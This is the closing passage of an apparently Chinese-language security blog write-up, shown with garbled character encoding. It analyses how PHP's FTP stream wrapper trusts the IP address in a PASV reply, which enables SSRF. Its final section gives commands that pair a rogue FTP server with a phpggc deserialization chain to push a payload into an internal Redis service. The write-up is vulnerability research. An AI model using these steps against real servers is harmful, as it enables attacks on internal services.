</span></span></code></pre></div><h2 id=äº§ç”ŸåŸå› >äº§ç”ŸåŸå› </h2><p>æˆ‘ä»¬å¯ä»¥åœ¨ <code>ext/standard/ftp_fopen_wrapper.c</code> æŸ¥çœ‹åˆ°ç›¸å…³æºç ,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>static</span> <span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span> <span style=color:#50fa7b>php_fopen_do_pasv</span>(php_stream <span style=color:#ff79c6>*</span>stream, <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>ip, <span style=color:#8be9fd>size_t</span> ip_size, <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>**</span>phoststart)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        <span style=color:#8be9fd>char</span> tmp_line[<span style=color:#bd93f9>512</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        <span style=color:#8be9fd>int</span> result, i;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        <span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span> portno;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>tpath, <span style=color:#ff79c6>*</span>ttpath, <span style=color:#ff79c6>*</span>hoststart<span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>NULL</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff79c6>#ifdef HAVE_IPV6
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff79c6></span>        <span style=color:#6272a4>/* We try EPSV first, needed for IPv6 and works on some IPv4 servers */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        <span style=color:#50fa7b>php_stream_write_string</span>(stream, <span style=color:#f1fa8c>&#34;EPSV</span><span style=color:#f1fa8c>\r\n</span><span style=color:#f1fa8c>&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        result <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>GET_FTP_RESULT</span>(stream);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#6272a4>/* check if we got a 229 response */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#ff79c6>if</span> (result <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>229</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#ff79c6>#endif
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#ff79c6></span>                <span style=color:#6272a4>/* EPSV failed, let&#39;s try PASV */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>                <span style=color:#50fa7b>php_stream_write_string</span>(stream, <span style=color:#f1fa8c>&#34;PASV</span><span style=color:#f1fa8c>\r\n</span><span style=color:#f1fa8c>&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>                result <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>GET_FTP_RESULT</span>(stream);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>                <span style=color:#6272a4>/* make sure we got a 227 response */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                <span style=color:#ff79c6>if</span> (result <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>227</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>                }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>                <span style=color:#6272a4>/* parse pasv command (129, 80, 95, 25, 13, 221) */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>                tpath <span style=color:#ff79c6>=</span> tmp_line;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>                <span style=color:#6272a4>/* skip over the &#34;227 Some message &#34; part */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>                <span style=color:#ff79c6>for</span> (tpath <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>4</span>; <span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span><span style=color:#50fa7b>isdigit</span>((<span style=color:#8be9fd>int</span>) <span style=color:#ff79c6>*</span>tpath); tpath<span style=color:#ff79c6>++</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>                <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!*</span>tpath) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>                }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>                <span style=color:#6272a4>/* skip over the host ip, to get the port */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>                hoststart <span style=color:#ff79c6>=</span> tpath;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>                <span style=color:#ff79c6>for</span> (i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>4</span>; i<span style=color:#ff79c6>++</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>                        <span style=color:#ff79c6>for</span> (; <span style=color:#50fa7b>isdigit</span>((<span style=color:#8be9fd>int</span>) <span style=color:#ff79c6>*</span>tpath); tpath<span style=color:#ff79c6>++</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>                        <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;,&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>                                <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>                        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>                        <span style=color:#ff79c6>*</span>tpath<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;.&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>                        tpath<span style=color:#ff79c6>++</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>                }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>                tpath[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>                <span style=color:#50fa7b>memcpy</span>(ip, hoststart, ip_size);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>                ip[ip_size<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>                hoststart <span style=color:#ff79c6>=</span> ip;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>                <span style=color:#6272a4>/* pull out the MSB of the port */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>                portno <span style=color:#ff79c6>=</span> (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span>) <span style=color:#50fa7b>strtoul</span>(tpath, <span style=color:#ff79c6>&amp;</span>ttpath, <span style=color:#bd93f9>10</span>) <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>256</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>                <span style=color:#ff79c6>if</span> (ttpath <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>NULL</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>                        <span style=color:#6272a4>/* didn&#39;t get correct response from PASV */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>                }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>                tpath <span style=color:#ff79c6>=</span> ttpath;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span>                <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;,&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>                }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span>                tpath<span style=color:#ff79c6>++</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span>                <span style=color:#6272a4>/* pull out the LSB of the port */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>                portno <span style=color:#ff79c6>+=</span> (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span>) <span style=color:#50fa7b>strtoul</span>(tpath, <span style=color:#ff79c6>&amp;</span>ttpath, <span style=color:#bd93f9>10</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span><span style=color:#ff79c6>#ifdef HAVE_IPV6
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span><span style=color:#ff79c6></span>        } <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span>                <span style=color:#6272a4>/* parse epsv command (|||6446|) */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span>                <span style=color:#ff79c6>for</span> (i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>, tpath <span style=color:#ff79c6>=</span> tmp_line <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>4</span>; <span style=color:#ff79c6>*</span>tpath; tpath<span style=color:#ff79c6>++</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>                        <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;|&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span>                                i<span style=color:#ff79c6>++</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span>                                <span style=color:#ff79c6>if</span> (i <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>3</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>                                        <span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span>                        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span>                }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span>                <span style=color:#ff79c6>if</span> (i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>3</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>                }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span>                <span style=color:#6272a4>/* pull out the port */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span>                portno <span style=color:#ff79c6>=</span> (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span>) <span style=color:#50fa7b>strtoul</span>(tpath <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>, <span style=color:#ff79c6>&amp;</span>ttpath, <span style=color:#bd93f9>10</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span><span style=color:#ff79c6>#endif
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span><span style=color:#ff79c6></span>        <span style=color:#ff79c6>if</span> (ttpath <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>NULL</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span>                <span style=color:#6272a4>/* didn&#39;t get correct response from EPSV/PASV */</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span>                <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span>        <span style=color:#ff79c6>if</span> (phoststart) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span>                <span style=color:#ff79c6>*</span>phoststart <span style=color:#ff79c6>=</span> hoststart;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86</span><span>        <span style=color:#ff79c6>return</span> portno;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87</span><span>}
</span></span></code></pre></div><p>æ³¨æ„åˆ°</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>tpath[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#50fa7b>memcpy</span>(ip, hoststart, ip_size);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>ip[ip_size<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>hoststart <span style=color:#ff79c6>=</span> ip;
</span></span></code></pre></div><p>å¯ä»¥å‘ç°, è™½ç„¶åœ¨æ³¨é‡Šé‡Œé¢å†™äº† <code>skip over the host ip, to get the port</code>, ä½†å®é™…ä¸Šè¿˜æ˜¯æ²¡æœ‰ skip, ä¼šå°† PASV ç»™å‡ºçš„ ip æœ€åç”¨äºæ•°æ®é€šé“çš„è¿æ¥, å¯¼è‡´æ¼æ´äº§ç”Ÿ.
åŒæ—¶ php è¿˜æ˜¯ç”¨ <code>portno += (unsigned short) strtoul(tpath, &amp;ttpath, 10);</code> æ¥è·å–çš„ç«¯å£, è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆ (127,0,0,1,0,9000) å’Œ (127,0,0,1,35,40) æ˜¯ä¸€æ ·çš„, å› ä¸º php åº•å±‚å¹¶æ²¡æœ‰æŠŠä»–è½¬æ¢æˆ unsigned char åå†ç›¸åŠ çš„ 233</p><h2 id=real-world>Real World</h2><p>å› ä¸ºéœ€è¦å®Œæ•´æ§åˆ¶ filename çš„å…³ç³», è¿™ä¸ªæ¼æ´åœ¨çœŸå®æƒ…å†µä¸‹æ¯”è¾ƒä¸å¸¸è§, æˆ‘è§‰å¾—è¿™ä¸ªæ¼æ´åˆ©ç”¨åœ¨ååºåˆ—åŒ–ä¸Šå¯èƒ½ä¼šæ›´åŠ å¥½, æ¯”å¦‚ phpggc ä¸Šå­˜åœ¨çš„ä¸€ä¸ªé“¾ <code>SwiftMailer/FW1</code>, æˆ‘ä»¬å°† <code>gadgetchains/SwiftMailer/FW/1/gadgets.php</code> ä¸­çš„ <code>private $_mode = 'w+b';</code> æ”¹æˆ <code>private $_mode = 'w';</code>, è¿™æ ·ä½¿å¾— fopen å…¼å®¹ ftp åè®®, ä½¿å¾—ååºåˆ—åŒ–é“¾æ­£å¸¸è¿›è¡Œ.</p><p>ç„¶ååˆ©ç”¨çš„æ–¹å¼å…¶å®ä¸ rouge_mysql_server ç±»ä¼¼, éœ€è¦å®¢æˆ·ç«¯è¿æ¥æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨, æ¯”å¦‚æˆ‘ä»¬éœ€è¦æ”»å‡» redis æœåŠ¡, é¦–å…ˆåœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œ <code>python3 server.py 19132 127.0.0.1 6379</code>, å†ä½¿ç”¨ <code>./phpggc SwiftMailer/FW1 "ftp://rouge_ftp_server:19132/asd" ssrf_payload_file</code> æ¥ç”Ÿæˆæˆ‘ä»¬çš„åºåˆ—åŒ– payload, åœ¨ååºåˆ—åŒ–æ¼æ´è¢«è§¦å‘å ssrf_payload_file ä¸­çš„å†…å®¹å°±ä¼šè¢«å‘å¾€ 127.0.0.1:6379.</p><p>è¿™æ ·å°±èƒ½æ‰©å±•éƒ¨åˆ†ååºåˆ—åŒ–åˆ©ç”¨çš„æ–¹å¼, æ¯”å¦‚åœ¨ä¸çŸ¥é“ WEB ç›®å½•, æˆ–è€… WEB ç›®å½•ä¸å¯å†™çš„æƒ…å†µä¸‹, å¯ä»¥å°è¯• ssrf ä¸€äº› redis æœåŠ¡, æ‰©å¤§æˆ‘ä»¬çš„æ”»å‡»é¢.</p><h2 id=å‚è€ƒ>å‚è€ƒ</h2><ol><li><a href=https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE title rel="noopener nofollow noreferrer" target=_blank>https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE</a></li><li><a href=https://github.com/ambionics/phpggc title rel="noopener nofollow noreferrer" target=_blank>https://github.com/ambionics/phpggc</a></li><li><a href=https://github.com/php/php-src title rel="noopener nofollow noreferrer" target=_blank>https://github.com/php/php-src</a></li></ol></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/web>web</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div class=footer-info>Â© 2017 - 2023, rmb122</div><div style=display:flex><span class=border></span><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a><a class=soc href=https://rmb122.com/index.xml title=RSS><i data-feather=rss></i></a></div></footer><script>feather.replace()</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-1MH3QGWHV5"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-1MH3QGWHV5",{anonymize_ip:!1})}</script><script src=https://rmb122.com/js/medium-zoom.min.js></script><script>for(let e of document.getElementsByTagName("img"))mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})</script></div></body></html>